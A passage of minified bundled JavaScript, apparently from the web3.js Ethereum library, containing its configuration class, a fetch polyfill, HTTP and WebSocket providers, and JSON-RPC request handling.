        waitWithTimeout: NE
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    class ef {
        constructor() {
            this._emitter = new M0
        }
        on(t, n) {
            this._emitter.on(t, n)
        }
        once(t, n) {
            this._emitter.once(t, n)
        }
        off(t, n) {
            this._emitter.off(t, n)
        }
        emit(t, n) {
            this._emitter.emit(t, n)
        }
        listenerCount(t) {
            return this._emitter.listenerCount(t)
        }
        listeners(t) {
            return this._emitter.listeners(t)
        }
        eventNames() {
            return this._emitter.eventNames()
        }
        removeAllListeners() {
            return this._emitter.removeAllListeners()
        }
        setMaxListenerWarningThreshold(t) {
            this._emitter.setMaxListeners(t)
        }
        getMaxListeners() {
            return this._emitter.getMaxListeners()
        }
    }
    var fo;
    (function(e) {
        e.CONFIG_CHANGE = "CONFIG_CHANGE"
    })(fo || (fo = {}));
    class VN extends ef {
        constructor(t) {
            super(), this.config = {
                handleRevert: !1,
                defaultAccount: void 0,
                defaultBlock: "latest",
                transactionBlockTimeout: 50,
                transactionConfirmationBlocks: 24,
                transactionPollingInterval: 1e3,
                transactionPollingTimeout: 750 * 1e3,
                transactionReceiptPollingInterval: void 0,
                transactionSendTimeout: 750 * 1e3,
                transactionConfirmationPollingInterval: void 0,
                blockHeaderTimeout: 10,
                maxListenersWarningThreshold: 100,
                contractDataInputFill: "data",
                defaultNetworkId: void 0,
                defaultChain: "mainnet",
                defaultHardfork: "london",
                defaultCommon: void 0,
                defaultTransactionType: "0x2",
                defaultMaxPriorityFeePerGas: Sr(25e8),
                enableExperimentalFeatures: {
                    useSubscriptionWhenCheckingBlockTimeout: !1,
                    useRpcCallSpecification: !1
                },
                transactionBuilder: void 0,
                transactionTypeParser: void 0,
                customTransactionSchema: void 0,
                defaultReturnFormat: At,
                ignoreGasPricing: !1
            }, this.setConfig(t ?? {})
        }
        setConfig(t) {
            const n = Object.keys(t);
            for (const r of n) this._triggerConfigChange(r, t[r]), !X(t[r]) && typeof t[r] == "number" && r === "maxListenersWarningThreshold" && this.setMaxListenerWarningThreshold(Number(t[r]));
            Object.assign(this.config, t)
        }
        get handleRevert() {
            return this.config.handleRevert
        }
        set handleRevert(t) {
            this._triggerConfigChange("handleRevert", t), this.config.handleRevert = t
        }
        get contractDataInputFill() {
            return this.config.contractDataInputFill
        }
        set contractDataInputFill(t) {
            this._triggerConfigChange("contractDataInputFill", t), this.config.contractDataInputFill = t
        }
        get defaultAccount() {
            return this.config.defaultAccount
        }
        set defaultAccount(t) {
            this._triggerConfigChange("defaultAccount", t), this.config.defaultAccount = t
        }
        get defaultBlock() {
            return this.config.defaultBlock
        }
        set defaultBlock(t) {
            this._triggerConfigChange("defaultBlock", t), this.config.defaultBlock = t
        }
        get transactionSendTimeout() {
            return this.config.transactionSendTimeout
        }
        set transactionSendTimeout(t) {
            this._triggerConfigChange("transactionSendTimeout", t), this.config.transactionSendTimeout = t
        }
        get transactionBlockTimeout() {
            return this.config.transactionBlockTimeout
        }
        set transactionBlockTimeout(t) {
            this._triggerConfigChange("transactionBlockTimeout", t), this.config.transactionBlockTimeout = t
        }
        get transactionConfirmationBlocks() {
            return this.config.transactionConfirmationBlocks
        }
        set transactionConfirmationBlocks(t) {
            this._triggerConfigChange("transactionConfirmationBlocks", t), this.config.transactionConfirmationBlocks = t
        }
        get transactionPollingInterval() {
            return this.config.transactionPollingInterval
        }
        set transactionPollingInterval(t) {
            this._triggerConfigChange("transactionPollingInterval", t), this.config.transactionPollingInterval = t, this.transactionReceiptPollingInterval = t, this.transactionConfirmationPollingInterval = t
        }
        get transactionPollingTimeout() {
            return this.config.transactionPollingTimeout
        }
        set transactionPollingTimeout(t) {
            this._triggerConfigChange("transactionPollingTimeout", t), this.config.transactionPollingTimeout = t
        }
        get transactionReceiptPollingInterval() {
            return this.config.transactionReceiptPollingInterval
        }
        set transactionReceiptPollingInterval(t) {
            this._triggerConfigChange("transactionReceiptPollingInterval", t), this.config.transactionReceiptPollingInterval = t
        }
        get transactionConfirmationPollingInterval() {
            return this.config.transactionConfirmationPollingInterval
        }
        set transactionConfirmationPollingInterval(t) {
            this._triggerConfigChange("transactionConfirmationPollingInterval", t), this.config.transactionConfirmationPollingInterval = t
        }
        get blockHeaderTimeout() {
            return this.config.blockHeaderTimeout
        }
        set blockHeaderTimeout(t) {
            this._triggerConfigChange("blockHeaderTimeout", t), this.config.blockHeaderTimeout = t
        }
        get enableExperimentalFeatures() {
            return this.config.enableExperimentalFeatures
        }
        set enableExperimentalFeatures(t) {
            this._triggerConfigChange("enableExperimentalFeatures", t), this.config.enableExperimentalFeatures = t
        }
        get maxListenersWarningThreshold() {
            return this.config.maxListenersWarningThreshold
        }
        set maxListenersWarningThreshold(t) {
            this._triggerConfigChange("maxListenersWarningThreshold", t), this.setMaxListenerWarningThreshold(t), this.config.maxListenersWarningThreshold = t
        }
        get defaultReturnFormat() {
            return this.config.defaultReturnFormat
        }
        set defaultReturnFormat(t) {
            this._triggerConfigChange("defaultReturnFormat", t), this.config.defaultReturnFormat = t
        }
        get defaultNetworkId() {
            return this.config.defaultNetworkId
        }
        set defaultNetworkId(t) {
            this._triggerConfigChange("defaultNetworkId", t), this.config.defaultNetworkId = t
        }
        get defaultChain() {
            return this.config.defaultChain
        }
        set defaultChain(t) {
            if (!X(this.config.defaultCommon) && !X(this.config.defaultCommon.baseChain) && t !== this.config.defaultCommon.baseChain) throw new gy(this.config.defaultChain, t);
            this._triggerConfigChange("defaultChain", t), this.config.defaultChain = t
        }
        get defaultHardfork() {
            return this.config.defaultHardfork
        }
        set defaultHardfork(t) {
            if (!X(this.config.defaultCommon) && !X(this.config.defaultCommon.hardfork) && t !== this.config.defaultCommon.hardfork) throw new my(this.config.defaultCommon.hardfork, t);
            this._triggerConfigChange("defaultHardfork", t), this.config.defaultHardfork = t
        }
        get defaultCommon() {
            return this.config.defaultCommon
        }
        set defaultCommon(t) {
            if (!X(this.config.defaultHardfork) && !X(t) && !X(t.hardfork) && this.config.defaultHardfork !== t.hardfork) throw new my(this.config.defaultHardfork, t.hardfork);
            if (!X(this.config.defaultChain) && !X(t) && !X(t.baseChain) && this.config.defaultChain !== t.baseChain) throw new gy(this.config.defaultChain, t.baseChain);
            this._triggerConfigChange("defaultCommon", t), this.config.defaultCommon = t
        }
        get ignoreGasPricing() {
            return this.config.ignoreGasPricing
        }
        set ignoreGasPricing(t) {
            this._triggerConfigChange("ignoreGasPricing", t), this.config.ignoreGasPricing = t
        }
        get defaultTransactionType() {
            return this.config.defaultTransactionType
        }
        set defaultTransactionType(t) {
            this._triggerConfigChange("defaultTransactionType", t), this.config.defaultTransactionType = t
        }
        get defaultMaxPriorityFeePerGas() {
            return this.config.defaultMaxPriorityFeePerGas
        }
        set defaultMaxPriorityFeePerGas(t) {
            this._triggerConfigChange("defaultMaxPriorityFeePerGas", t), this.config.defaultMaxPriorityFeePerGas = t
        }
        get transactionBuilder() {
            return this.config.transactionBuilder
        }
        set transactionBuilder(t) {
            this._triggerConfigChange("transactionBuilder", t), this.config.transactionBuilder = t
        }
        get transactionTypeParser() {
            return this.config.transactionTypeParser
        }
        set transactionTypeParser(t) {
            this._triggerConfigChange("transactionTypeParser", t), this.config.transactionTypeParser = t
        }
        get customTransactionSchema() {
            return this.config.customTransactionSchema
        }
        set customTransactionSchema(t) {
            this._triggerConfigChange("customTransactionSchema", t), this.config.customTransactionSchema = t
        }
        _triggerConfigChange(t, n) {
            this.emit(fo.CONFIG_CHANGE, {
                name: t,
                oldValue: this.config[t],
                newValue: n
            })
        }
    }
    var Np = {
        exports: {}
    };
    (function(e, t) {
        var n = typeof globalThis < "u" && globalThis || typeof self < "u" && self || typeof va < "u" && va,
            r = function() {
                function o() {
                    this.fetch = !1, this.DOMException = n.DOMException
                }
                return o.prototype = n, new o
            }();
        (function(o) {
            (function(s) {
                var a = typeof o < "u" && o || typeof self < "u" && self || typeof a < "u" && a,
                    l = {
                        searchParams: "URLSearchParams" in a,
                        iterable: "Symbol" in a && "iterator" in Symbol,
                        blob: "FileReader" in a && "Blob" in a && function() {
                            try {
                                return new Blob, !0
                            } catch {
                                return !1
                            }
                        }(),
                        formData: "FormData" in a,
                        arrayBuffer: "ArrayBuffer" in a
                    };

                function u(A) {
                    return A && DataView.prototype.isPrototypeOf(A)
                }
                if (l.arrayBuffer) var c = ["[object Int8Array]", "[object Uint8Array]", "[object Uint8ClampedArray]", "[object Int16Array]", "[object Uint16Array]", "[object Int32Array]", "[object Uint32Array]", "[object Float32Array]", "[object Float64Array]"],
                    d = ArrayBuffer.isView || function(A) {
                        return A && c.indexOf(Object.prototype.toString.call(A)) > -1
                    };

                function f(A) {
                    if (typeof A != "string" && (A = String(A)), /[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(A) || A === "") throw new TypeError('Invalid character in header field name: "' + A + '"');
                    return A.toLowerCase()
                }

                function h(A) {
                    return typeof A != "string" && (A = String(A)), A
                }

                function v(A) {
                    var P = {
                        next: function() {
                            var O = A.shift();
                            return {
                                done: O === void 0,
                                value: O
                            }
                        }
                    };
                    return l.iterable && (P[Symbol.iterator] = function() {
                        return P
                    }), P
                }

                function p(A) {
                    this.map = {}, A instanceof p ? A.forEach(function(P, O) {
                        this.append(O, P)
                    }, this) : Array.isArray(A) ? A.forEach(function(P) {
                        this.append(P[0], P[1])
                    }, this) : A && Object.getOwnPropertyNames(A).forEach(function(P) {
                        this.append(P, A[P])
                    }, this)
                }
                p.prototype.append = function(A, P) {
                    A = f(A), P = h(P);
                    var O = this.map[A];
                    this.map[A] = O ? O + ", " + P : P
                }, p.prototype.delete = function(A) {
                    delete this.map[f(A)]
                }, p.prototype.get = function(A) {
                    return A = f(A), this.has(A) ? this.map[A] : null
                }, p.prototype.has = function(A) {
                    return this.map.hasOwnProperty(f(A))
                }, p.prototype.set = function(A, P) {
                    this.map[f(A)] = h(P)
                }, p.prototype.forEach = function(A, P) {
                    for (var O in this.map) this.map.hasOwnProperty(O) && A.call(P, this.map[O], O, this)
                }, p.prototype.keys = function() {
                    var A = [];
                    return this.forEach(function(P, O) {
                        A.push(O)
                    }), v(A)
                }, p.prototype.values = function() {
                    var A = [];
                    return this.forEach(function(P) {
                        A.push(P)
                    }), v(A)
                }, p.prototype.entries = function() {
                    var A = [];
                    return this.forEach(function(P, O) {
                        A.push([O, P])
                    }), v(A)
                }, l.iterable && (p.prototype[Symbol.iterator] = p.prototype.entries);

                function w(A) {
                    if (A.bodyUsed) return Promise.reject(new TypeError("Already read"));
                    A.bodyUsed = !0
                }

                function m(A) {
                    return new Promise(function(P, O) {
                        A.onload = function() {
                            P(A.result)
                        }, A.onerror = function() {
                            O(A.error)
                        }
                    })
                }

                function g(A) {
                    var P = new FileReader,
                        O = m(P);
                    return P.readAsArrayBuffer(A), O
                }

                function y(A) {
                    var P = new FileReader,
                        O = m(P);
                    return P.readAsText(A), O
                }

                function x(A) {
                    for (var P = new Uint8Array(A), O = new Array(P.length), T = 0; T < P.length; T++) O[T] = String.fromCharCode(P[T]);
                    return O.join("")
                }

                function E(A) {
                    if (A.slice) return A.slice(0);
                    var P = new Uint8Array(A.byteLength);
                    return P.set(new Uint8Array(A)), P.buffer
                }

                function k() {
                    return this.bodyUsed = !1, this._initBody = function(A) {
                        this.bodyUsed = this.bodyUsed, this._bodyInit = A, A ? typeof A == "string" ? this._bodyText = A : l.blob && Blob.prototype.isPrototypeOf(A) ? this._bodyBlob = A : l.formData && FormData.prototype.isPrototypeOf(A) ? this._bodyFormData = A : l.searchParams && URLSearchParams.prototype.isPrototypeOf(A) ? this._bodyText = A.toString() : l.arrayBuffer && l.blob && u(A) ? (this._bodyArrayBuffer = E(A.buffer), this._bodyInit = new Blob([this._bodyArrayBuffer])) : l.arrayBuffer && (ArrayBuffer.prototype.isPrototypeOf(A) || d(A)) ? this._bodyArrayBuffer = E(A) : this._bodyText = A = Object.prototype.toString.call(A) : this._bodyText = "", this.headers.get("content-type") || (typeof A == "string" ? this.headers.set("content-type", "text/plain;charset=UTF-8") : this._bodyBlob && this._bodyBlob.type ? this.headers.set("content-type", this._bodyBlob.type) : l.searchParams && URLSearchParams.prototype.isPrototypeOf(A) && this.headers.set("content-type", "application/x-www-form-urlencoded;charset=UTF-8"))
                    }, l.blob && (this.blob = function() {
                        var A = w(this);
                        if (A) return A;
                        if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
                        if (this._bodyArrayBuffer) return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                        if (this._bodyFormData) throw new Error("could not read FormData body as blob");
                        return Promise.resolve(new Blob([this._bodyText]))
                    }, this.arrayBuffer = function() {
                        if (this._bodyArrayBuffer) {
                            var A = w(this);
                            return A || (ArrayBuffer.isView(this._bodyArrayBuffer) ? Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset, this._bodyArrayBuffer.byteOffset + this._bodyArrayBuffer.byteLength)) : Promise.resolve(this._bodyArrayBuffer))
                        } else return this.blob().then(g)
                    }), this.text = function() {
                        var A = w(this);
                        if (A) return A;
                        if (this._bodyBlob) return y(this._bodyBlob);
                        if (this._bodyArrayBuffer) return Promise.resolve(x(this._bodyArrayBuffer));
                        if (this._bodyFormData) throw new Error("could not read FormData body as text");
                        return Promise.resolve(this._bodyText)
                    }, l.formData && (this.formData = function() {
                        return this.text().then(C)
                    }), this.json = function() {
                        return this.text().then(JSON.parse)
                    }, this
                }
                var I = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];

                function _(A) {
                    var P = A.toUpperCase();
                    return I.indexOf(P) > -1 ? P : A
                }

                function L(A, P) {
                    if (!(this instanceof L)) throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                    P = P || {};
                    var O = P.body;
                    if (A instanceof L) {
                        if (A.bodyUsed) throw new TypeError("Already read");
                        this.url = A.url, this.credentials = A.credentials, P.headers || (this.headers = new p(A.headers)), this.method = A.method, this.mode = A.mode, this.signal = A.signal, !O && A._bodyInit != null && (O = A._bodyInit, A.bodyUsed = !0)
                    } else this.url = String(A);
                    if (this.credentials = P.credentials || this.credentials || "same-origin", (P.headers || !this.headers) && (this.headers = new p(P.headers)), this.method = _(P.method || this.method || "GET"), this.mode = P.mode || this.mode || null, this.signal = P.signal || this.signal, this.referrer = null, (this.method === "GET" || this.method === "HEAD") && O) throw new TypeError("Body not allowed for GET or HEAD requests");
                    if (this._initBody(O), (this.method === "GET" || this.method === "HEAD") && (P.cache === "no-store" || P.cache === "no-cache")) {
                        var T = /([?&])_=[^&]*/;
                        if (T.test(this.url)) this.url = this.url.replace(T, "$1_=" + new Date().getTime());
                        else {
                            var B = /\?/;
                            this.url += (B.test(this.url) ? "&" : "?") + "_=" + new Date().getTime()
                        }
                    }
                }
                L.prototype.clone = function() {
                    return new L(this, {
                        body: this._bodyInit
                    })
                };

                function C(A) {
                    var P = new FormData;
                    return A.trim().split("&").forEach(function(O) {
                        if (O) {
                            var T = O.split("="),
                                B = T.shift().replace(/\+/g, " "),
                                R = T.join("=").replace(/\+/g, " ");
                            P.append(decodeURIComponent(B), decodeURIComponent(R))
                        }
                    }), P
                }

                function M(A) {
                    var P = new p,
                        O = A.replace(/\r?\n[\t ]+/g, " ");
                    return O.split("\r").map(function(T) {
                        return T.indexOf(`
`) === 0 ? T.substr(1, T.length) : T
                    }).forEach(function(T) {
                        var B = T.split(":"),
                            R = B.shift().trim();
                        if (R) {
                            var $ = B.join(":").trim();
                            P.append(R, $)
                        }
                    }), P
                }
                k.call(L.prototype);

                function F(A, P) {
                    if (!(this instanceof F)) throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                    P || (P = {}), this.type = "default", this.status = P.status === void 0 ? 200 : P.status, this.ok = this.status >= 200 && this.status < 300, this.statusText = P.statusText === void 0 ? "" : "" + P.statusText, this.headers = new p(P.headers), this.url = P.url || "", this._initBody(A)
                }
                k.call(F.prototype), F.prototype.clone = function() {
                    return new F(this._bodyInit, {
                        status: this.status,
                        statusText: this.statusText,
                        headers: new p(this.headers),
                        url: this.url
                    })
                }, F.error = function() {
                    var A = new F(null, {
                        status: 0,
                        statusText: ""
                    });
                    return A.type = "error", A
                };
                var U = [301, 302, 303, 307, 308];
                F.redirect = function(A, P) {
                    if (U.indexOf(P) === -1) throw new RangeError("Invalid status code");
                    return new F(null, {
                        status: P,
                        headers: {
                            location: A
                        }
                    })
                }, s.DOMException = a.DOMException;
                try {
                    new s.DOMException
                } catch {
                    s.DOMException = function(P, O) {
                        this.message = P, this.name = O;
                        var T = Error(P);
                        this.stack = T.stack
                    }, s.DOMException.prototype = Object.create(Error.prototype), s.DOMException.prototype.constructor = s.DOMException
                }

                function Q(A, P) {
                    return new Promise(function(O, T) {
                        var B = new L(A, P);
                        if (B.signal && B.signal.aborted) return T(new s.DOMException("Aborted", "AbortError"));
                        var R = new XMLHttpRequest;

                        function $() {
                            R.abort()
                        }
                        R.onload = function() {
                            var ie = {
                                status: R.status,
                                statusText: R.statusText,
                                headers: M(R.getAllResponseHeaders() || "")
                            };
                            ie.url = "responseURL" in R ? R.responseURL : ie.headers.get("X-Request-URL");
                            var be = "response" in R ? R.response : R.responseText;
                            setTimeout(function() {
                                O(new F(be, ie))
                            }, 0)
                        }, R.onerror = function() {
                            setTimeout(function() {
                                T(new TypeError("Network request failed"))
                            }, 0)
                        }, R.ontimeout = function() {
                            setTimeout(function() {
                                T(new TypeError("Network request failed"))
                            }, 0)
                        }, R.onabort = function() {
                            setTimeout(function() {
                                T(new s.DOMException("Aborted", "AbortError"))
                            }, 0)
                        };

                        function Z(ie) {
                            try {
                                return ie === "" && a.location.href ? a.location.href : ie
                            } catch {
                                return ie
                            }
                        }
                        R.open(B.method, Z(B.url), !0), B.credentials === "include" ? R.withCredentials = !0 : B.credentials === "omit" && (R.withCredentials = !1), "responseType" in R && (l.blob ? R.responseType = "blob" : l.arrayBuffer && B.headers.get("Content-Type") && B.headers.get("Content-Type").indexOf("application/octet-stream") !== -1 && (R.responseType = "arraybuffer")), P && typeof P.headers == "object" && !(P.headers instanceof p) ? Object.getOwnPropertyNames(P.headers).forEach(function(ie) {
                            R.setRequestHeader(ie, h(P.headers[ie]))
                        }) : B.headers.forEach(function(ie, be) {
                            R.setRequestHeader(be, ie)
                        }), B.signal && (B.signal.addEventListener("abort", $), R.onreadystatechange = function() {
                            R.readyState === 4 && B.signal.removeEventListener("abort", $)
                        }), R.send(typeof B._bodyInit > "u" ? null : B._bodyInit)
                    })
                }
                return Q.polyfill = !0, a.fetch || (a.fetch = Q, a.Headers = p, a.Request = L, a.Response = F), s.Headers = p, s.Request = L, s.Response = F, s.fetch = Q, s
            })({})
        })(r), r.fetch.ponyfill = !0, delete r.fetch.polyfill;
        var i = n.fetch ? n : r;
        t = i.fetch, t.default = i.fetch, t.fetch = i.fetch, t.Headers = i.Headers, t.Request = i.Request, t.Response = i.Response, e.exports = t
    })(Np, Np.exports);
    var WN = Np.exports;
    const qN = dd(WN);
    var QN = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class tf extends Hl {
        constructor(t, n) {
            if (super(), !tf.validateClientUrl(t)) throw new Ap(t);
            this.clientUrl = t, this.httpProviderOptions = n
        }
        static validateClientUrl(t) {
            return typeof t == "string" ? /^http(s)?:\/\//i.test(t) : !1
        }
        getStatus() {
            throw new er
        }
        supportsSubscriptions() {
            return !1
        }
        request(t, n) {
            var r;
            return QN(this, void 0, void 0, function*() {
                const i = Object.assign(Object.assign({}, (r = this.httpProviderOptions) === null || r === void 0 ? void 0 : r.providerOptions), n),
                    o = yield qN(this.clientUrl, Object.assign(Object.assign({}, i), {
                        method: "POST",
                        headers: Object.assign(Object.assign({}, i.headers), {
                            "Content-Type": "application/json"
                        }),
                        body: JSON.stringify(t)
                    }));
                if (!o.ok) throw new Dn(yield o.json(), void 0, void 0, o.status);
                return yield o.json()
            })
        }
        on() {
            throw new er
        }
        removeListener() {
            throw new er
        }
        once() {
            throw new er
        }
        removeAllListeners() {
            throw new er
        }
        connect() {
            throw new er
        }
        disconnect() {
            throw new er
        }
        reset() {
            throw new er
        }
        reconnect() {
            throw new er
        }
    }
    var Co = null;
    typeof WebSocket < "u" ? Co = WebSocket : typeof MozWebSocket < "u" ? Co = MozWebSocket : typeof global < "u" ? Co = global.WebSocket || global.MozWebSocket : typeof window < "u" ? Co = window.WebSocket || window.MozWebSocket : typeof self < "u" && (Co = self.WebSocket || self.MozWebSocket);
    const KN = Co;
    class HE extends DE {
        constructor(t, n, r) {
            super(t, n, r)
        }
        _validateProviderPath(t) {
            return typeof t == "string" ? /^ws(s)?:\/\//i.test(t) : !1
        }
        getStatus() {
            if (this._socketConnection && !X(this._socketConnection)) switch (this._socketConnection.readyState) {
                case this._socketConnection.CONNECTING:
                    return "connecting";
                case this._socketConnection.OPEN:
                    return "connected";
                default:
                    return "disconnected"
            }
            return "disconnected"
        }
        _openSocketConnection() {
            this._socketConnection = new KN(this._socketPath, void 0, this._socketOptions && Object.keys(this._socketOptions).length === 0 ? void 0 : this._socketOptions)
        }
        _closeSocketConnection(t, n) {
            var r;
            (r = this._socketConnection) === null || r === void 0 || r.close(t, n)
        }
        _sendToSocket(t) {
            var n;
            if (this.getStatus() === "disconnected") throw new xp;
            (n = this._socketConnection) === null || n === void 0 || n.send(JSON.stringify(t))
        }
        _parseResponses(t) {
            return this.chunkResponseParser.parseResponse(t.data)
        }
        _addSocketListeners() {
            var t, n, r, i;
            (t = this._socketConnection) === null || t === void 0 || t.addEventListener("open", this._onOpenHandler), (n = this._socketConnection) === null || n === void 0 || n.addEventListener("message", this._onMessageHandler), (r = this._socketConnection) === null || r === void 0 || r.addEventListener("close", o => this._onCloseHandler(o)), (i = this._socketConnection) === null || i === void 0 || i.addEventListener("error", this._onErrorHandler)
        }
        _removeSocketListeners() {
            var t, n, r;
            (t = this._socketConnection) === null || t === void 0 || t.removeEventListener("message", this._onMessageHandler), (n = this._socketConnection) === null || n === void 0 || n.removeEventListener("open", this._onOpenHandler), (r = this._socketConnection) === null || r === void 0 || r.removeEventListener("close", this._onCloseHandler)
        }
        _onCloseEvent(t) {
            var n;
            if (this._reconnectOptions.autoReconnect && (![1e3, 1001].includes(t.code) || !t.wasClean)) {
                this._reconnect();
                return
            }
            this._clearQueues(t), this._removeSocketListeners(), this._onDisconnect(t.code, t.reason), (n = this._socketConnection) === null || n === void 0 || n.removeEventListener("error", this._onErrorHandler)
        }
    }
    const $E = e => Hl.isWeb3Provider(e),
        UE = e => typeof e != "string" && "request" in e && e.request.constructor.name === "Function",
        zE = e => typeof e != "string" && "request" in e && e.request.constructor.name === "AsyncFunction",
        GE = e => typeof e != "string" && "send" in e,
        VE = e => typeof e != "string" && "sendAsync" in e,
        Wu = e => e && ($E(e) || zE(e) || UE(e) || VE(e) || GE(e)),
        ZN = e => e && "supportsSubscriptions" in e ? e.supportsSubscriptions() : !!(e && typeof e != "string" && "on" in e);
    var th = function(e, t, n, r) {
            function i(o) {
                return o instanceof n ? o : new n(function(s) {
                    s(o)
                })
            }
            return new(n || (n = Promise))(function(o, s) {
                function a(c) {
                    try {
                        u(r.next(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function l(c) {
                    try {
                        u(r.throw(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function u(c) {
                    c.done ? o(c.value) : i(c.value).then(a, l)
                }
                u((r = r.apply(e, t || [])).next())
            })
        },
        Es;
    (function(e) {
        e.PROVIDER_CHANGED = "PROVIDER_CHANGED", e.BEFORE_PROVIDER_CHANGE = "BEFORE_PROVIDER_CHANGE"
    })(Es || (Es = {}));
    const Cy = {
        HttpProvider: tf,
        WebsocketProvider: HE
    };
    class Wi extends ef {
        constructor(t, n, r) {
            super(), X(t) || this.setProvider(t), this.useRpcCallSpecification = n, X(r) || (this.middleware = r)
        }
        static get providers() {
            return Cy
        }
        get provider() {
            return this._provider
        }
        get providers() {
            return Cy
        }
        setProvider(t) {
            let n;
            if (t && typeof t == "string" && this.providers)
                if (/^http(s)?:\/\//i.test(t)) n = new this.providers.HttpProvider(t);
                else if (/^ws(s)?:\/\//i.test(t)) n = new this.providers.WebsocketProvider(t);
            else throw new Rc(`Can't autodetect provider for "${t}"`);
            else X(t) ? n = void 0 : n = t;
            return this.emit(Es.BEFORE_PROVIDER_CHANGE, this._provider), this._provider = n, this.emit(Es.PROVIDER_CHANGED, this._provider), !0
        }
        setMiddleware(t) {
            this.middleware = t
        }
        send(t) {
            return th(this, void 0, void 0, function*() {
                const n = Object.assign({}, t);
                let r = yield this._sendRequest(n);
                if (X(this.middleware) || (r = yield this.middleware.processResponse(r)), ei(r)) return r.result;
                throw new Dn(r)
            })
        }
        sendBatch(t) {
            return th(this, void 0, void 0, function*() {
                return yield this._sendRequest(t)
            })
        }
        _sendRequest(t) {
            return th(this, void 0, void 0, function*() {
                const {
                    provider: n
                } = this;
                if (X(n)) throw new Rc("Provider not available. Use `.setProvider` or `.provider=` to initialize the provider.");
                let r = On(t) ? $0(t) : uo(t);
                if (X(this.middleware) || (r = yield this.middleware.processRequest(r)), $E(n)) {
                    let i;
                    try {
                        i = yield n.request(r)
                    } catch (o) {
                        i = o
                    }
                    return this._processJsonRpcResponse(r, i, {
                        legacy: !1,
                        error: !1
                    })
                }
                if (zE(n)) return n.request(r).then(i => this._processJsonRpcResponse(r, i, {
                    legacy: !0,
                    error: !1
                })).catch(i => this._processJsonRpcResponse(r, i, {
                    legacy: !0,
                    error: !0
                }));
                if (UE(n)) return new Promise((i, o) => {
                    const s = u => {
                            o(this._processJsonRpcResponse(r, u, {
                                legacy: !0,
                                error: !0
                            }))
                        },
                        a = u => i(this._processJsonRpcResponse(r, u, {
                            legacy: !0,
                            error: !1
                        })),
                        l = n.request(r, (u, c) => u ? s(u) : a(c));
                    RE(l) && l.then(a).catch(c => {
                        try {
                            const d = this._processJsonRpcResponse(r, c, {
                                legacy: !0,
                                error: !0
                            });
                            o(d)
                        } catch (d) {
                            o(d)
                        }
                    })
                });
                if (GE(n)) return new Promise((i, o) => {
                    n.send(r, (s, a) => {
                        if (s) return o(this._processJsonRpcResponse(r, s, {
                            legacy: !0,
                            error: !0
                        }));
                        if (X(a)) throw new Dn({}, 'Got a "nullish" response from provider.');
                        return i(this._processJsonRpcResponse(r, a, {
                            legacy: !0,
                            error: !1
                        }))
                    })
                });
                if (VE(n)) return n.sendAsync(r).then(i => this._processJsonRpcResponse(r, i, {
                    legacy: !0,
                    error: !1
                })).catch(i => this._processJsonRpcResponse(r, i, {
                    legacy: !0,
                    error: !0
                }));
                throw new Rc("Provider does not have a request or send method to use.")
            })
        }
        _processJsonRpcResponse(t, n, {
            legacy: r,
            error: i
        }) {
            if (X(n)) return this._buildResponse(t, null, i);
            if (ti(n)) {
                if (this.useRpcCallSpecification && j0(n)) {
                    const o = n;
                    if (St.get(o.error.code)) {
                        const s = St.get(o.error.code).error;
                        throw new s(o)
                    } else throw new en(o)
                } else if (!Wi._isReverted(n)) throw new Ud(n, t)
            }
            if (ei(n)) return n;
            if (n instanceof Error) throw Wi._isReverted(n), n;
            if (!r && On(t) && wl(n) || r && !i && On(t)) return n;
            if (r && i && On(t)) throw n;
            if (r && !ti(n) && !ei(n)) return this._buildResponse(t, n, i);
            throw On(t) && !Array.isArray(n) ? new Dn(n, "Got normal response for a batch request.") : !On(t) && Array.isArray(n) ? new Dn(n, "Got batch response for a normal request.") : new Dn(n, "Invalid response")
        }
        static _isReverted(t) {
            let n;
            if (ti(t) ? n = t.error : t instanceof Error && (n = t), n != null && n.message.includes("revert")) throw new Gi(n);
            return !1
        }
        _buildResponse(t, n, r) {
            const i = {
                jsonrpc: "2.0",
                id: On(t) ? t[0].id : "id" in t ? t.id : null
            };
            return r ? Object.assign(Object.assign({}, i), {
                error: n
            }) : Object.assign(Object.assign({}, i), {
                result: n
            })
        }
    }
    var ra = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class qu {
        constructor(t, n, r = !1) {
            this.requestManager = t, this.registeredSubscriptions = n, this.tolerateUnlinkedSubscription = r, this._subscriptions = new Map, this.requestManager.on(Es.BEFORE_PROVIDER_CHANGE, () => ra(this, void 0, void 0, function*() {
                yield this.unsubscribe()
            })), this.requestManager.on(Es.PROVIDER_CHANGED, () => {
                this.clear(), this.listenToProviderEvents()
            }), this.listenToProviderEvents()
        }
        listenToProviderEvents() {
            const t = this.requestManager.provider;
            !this.requestManager.provider || typeof(t == null ? void 0 : t.supportsSubscriptions) == "function" && !(t != null && t.supportsSubscriptions()) || typeof this.requestManager.provider.on == "function" && (typeof this.requestManager.provider.request == "function" ? this.requestManager.provider.on("message", n => this.messageListener(n)) : t.on("data", n => this.messageListener(n)))
        }
        messageListener(t) {
            var n, r, i;
            if (!t) throw new ar("Should not call messageListener with no data. Type was");
